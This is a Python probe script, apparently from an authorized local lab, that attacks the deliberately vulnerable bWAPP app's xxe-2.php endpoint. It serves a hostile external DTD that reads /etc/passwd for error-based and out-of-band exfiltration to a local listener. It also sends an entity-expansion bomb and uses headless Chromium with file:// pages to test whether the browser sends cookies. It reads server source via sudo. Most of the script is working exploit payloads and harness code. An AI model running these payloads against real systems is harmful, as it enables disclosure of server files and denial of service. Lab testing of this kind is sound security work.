#!/usr/bin/env python3
# loop3 t4 probe9: B2 OOB 判定 + SameSite 对照 + 版本证据
#  1) libxml/php 版本（外部实体行为的根因）
#  2) bWAPP xxe-2.php 是否加载外部 DTD（OOB 到本机 127.0.0.1:8099）
#  3) medium/high 级零写入对照（login=nonexist → UPDATE 0 行）
#  4) file:// 页面发子资源请求 vs 顶级导航，观察 Cookie 是否携带（解释 B3 的 img 失败）
#  5) 实体放大最小验证（仅测倍数，不做 DoS）
import json, time, datetime, threading, subprocess, re, os
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
UA = "loop3-t4/1.0 (authorized local lab)"
PORT = 8099
LOG = "/tmp/loop3-t4-probe9-sink.jsonl"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


rec("versions", php=sh("php -r 'echo PHP_VERSION;'"), libxml=sh("php -r 'echo LIBXML_DOTTED_VERSION;'"),
    libxml_compiled=sh("php -r 'echo LIBXML_VERSION;'"),
    entity_loader_fn=sh("php -r 'var_dump(function_exists(\"libxml_disable_entity_loader\"));'"),
    ini=sh("php -i | grep -E '^(allow_url_include|session.use_strict_mode)' "))

# ---------- sink ----------
DTD = ('<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
       '<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM \'file:///nonexistent/%file;\'>">\n'
       '%eval;\n%err;\n')


class Sink(BaseHTTPRequestHandler):
    def _l(self, m):
        n = int(self.headers.get("Content-Length") or 0)
        b = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        e = {"at": datetime.datetime.now().isoformat(), "method": m, "path": self.path,
             "client": self.client_address[0], "headers": dict(self.headers), "body": b[:1500]}
        open(LOG, "a").write(json.dumps(e, ensure_ascii=False) + "\n")
        print("SINK_HIT " + json.dumps(e, ensure_ascii=False)[:500], flush=True)

    def do_GET(self):
        self._l("GET")
        self.send_response(200)
        if self.path.endswith(".dtd"):
            self.send_header("Content-Type", "application/xml-dtd")
            self.end_headers()
            self.wfile.write(DTD.encode())
        else:
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

    def do_POST(self):
        self._l("POST")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)
rec("sink_up", port=PORT, bind="127.0.0.1")


def hits(marker=None):
    out = []
    if os.path.exists(LOG):
        for l in open(LOG):
            e = json.loads(l)
            if not marker or marker in e["path"]:
                out.append(e)
    return out


B = requests.Session()
B.headers["User-Agent"] = UA
r = B.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": "0", "form": "submit"},
           allow_redirects=False, timeout=20)
rec("bwapp_login", status=r.status_code, phpsessid=B.cookies.get("PHPSESSID"))
time.sleep(GAP)


def xxe(body, tag, level=None, note=""):
    if level is not None:
        B.cookies.set("security_level", str(level), domain="127.0.0.1", path="/")
    time.sleep(GAP)
    n0 = len(hits())
    r = B.post(BASE + "/bWAPP/xxe-2.php", data=body.encode(),
               headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
    time.sleep(1.5)
    new = hits()[n0:]
    return rec(tag, level=B.cookies.get("security_level"), status=r.status_code,
               resp=re.sub(r"\s+", " ", r.text)[:220], oob_new=len(new),
               oob_paths=[h["path"][:120] for h in new], note=note)


# ---- 2) 外部 DTD 是否被加载（OOB）----
def ext_dtd(tag_url, tag, level=None, note=""):
    body = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "' + tag_url + '"> %xxe;]>'
            '<reset><login>nonexistent_loop3</login><secret>x</secret></reset>')
    return xxe(body, tag, level, note)


ext_dtd("http://127.0.0.1:8099/xxe-ext-%d.dtd" % int(time.time()),
        "B2_OOB_external_dtd_low", 0, note="login 不存在 → UPDATE 0 行，零写入")

# ---- 3) medium/high 零写入对照 ----
ext_dtd("http://127.0.0.1:8099/xxe-med-%d.dtd" % int(time.time()),
        "B2_OOB_external_dtd_medium", 1)
ext_dtd("http://127.0.0.1:8099/xxe-high-%d.dtd" % int(time.time()),
        "B2_OOB_external_dtd_high", 2)
B.cookies.set("security_level", "0", domain="127.0.0.1", path="/")

# ---- 未定义实体（解析失败对照，零写入）----
xxe('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "x">]><reset><login>&undefined_l3;</login><secret>x</secret></reset>',
    "B2_undefined_entity_low_control", 0)
# ---- medium 下未定义实体（零写入对照）----
xxe('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "x">]><reset><secret>&undefined_l3m;</secret></reset>',
    "B2_undefined_entity_medium_control", 1)
B.cookies.set("security_level", "0", domain="127.0.0.1", path="/")

# ---- 5) 实体放大最小验证（只测倍数）----
lol = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "AAAAAAAAAA">'
for i in range(1, 4):
    prev = "a" if i == 1 else f"b{i-1}"
    cur = f"b{i}"
    lol += f'<!ENTITY {cur} "&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};&{prev};">'
lol += ']><reset><login>nonexistent_loop3</login><secret>&b3;</secret></reset>'
xxe(lol, "B2_entity_expansion_bomb_min", 0, note="3 层 ×10 放大 = 10^4 字节；仅测倍数")

# ---- 4) SameSite：file:// 子资源 vs 顶级导航 ----
evil_img = ('<!doctype html><html><body><img src="http://127.0.0.1:8099/subres-%d">'
            '</body></html>') % int(time.time())
evil_nav = ('<!doctype html><html><body><script>'
            'location.href="http://127.0.0.1:8099/topnav-%d"</script></body></html>') % int(time.time())
open("/tmp/l3-img.html", "w").write(evil_img)
open("/tmp/l3-nav.html", "w").write(evil_nav)
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    o = Options()
    o.binary_location = "/usr/bin/chromium"
    for a in ("--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"):
        o.add_argument(a)
    d = webdriver.Chrome(service=ChromeService(executable_path="/usr/bin/chromedriver"), options=o)
    d.get(BASE + "/bWAPP/login.php")
    d.add_cookie({"name": "security_level", "value": "0", "domain": "127.0.0.1", "path": "/"})
    d.get(BASE + "/bWAPP/login.php")
    d.find_element(By.NAME, "login").send_keys("bee")
    d.find_element(By.NAME, "password").send_keys("bug")
    d.find_element(By.NAME, "form").click()
    time.sleep(GAP)
    sess_name = "l3ss-" + datetime.datetime.now().strftime("%H%M%S")
    d.add_cookie({"name": "l3marker", "value": sess_name, "domain": "127.0.0.1", "path": "/"})
    rec("samesite_browser_ready", url=d.current_url, cookies=d.execute_script("return document.cookie"))
    n0 = len(hits())
    d.get("file:///tmp/l3-img.html")
    time.sleep(2.5)
    img_hits = [h for h in hits()[n0:] if "/subres" in h["path"]]
    rec("samesite_subresource_from_file_origin", hits=len(img_hits),
        cookie_sent=(img_hits[0]["headers"].get("Cookie") if img_hits else None),
        marker_present=(sess_name in (img_hits[0]["headers"].get("Cookie") or "") if img_hits else None))
    n1 = len(hits())
    d.get("file:///tmp/l3-nav.html")
    time.sleep(2.5)
    nav_hits = [h for h in hits()[n1:] if "/topnav" in h["path"]]
    rec("samesite_toplevel_nav_from_file_origin", hits=len(nav_hits),
        cookie_sent=(nav_hits[0]["headers"].get("Cookie") if nav_hits else None),
        marker_present=(sess_name in (nav_hits[0]["headers"].get("Cookie") or "") if nav_hits else None))
    d.quit()
except Exception as e:
    rec("samesite_browser_error", error=repr(e)[:400])

# ---- security.php 未登录行为 ----
rec("security_php_source", code=sh("sudo -n sed -n '1,80p' /var/www/html/bWAPP/security.php")[:1800])

with open("/tmp/loop3-t4-probe9.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
srv.shutdown()
print(json.dumps({"rc": "ok", "total_sink_hits": len(hits())}))
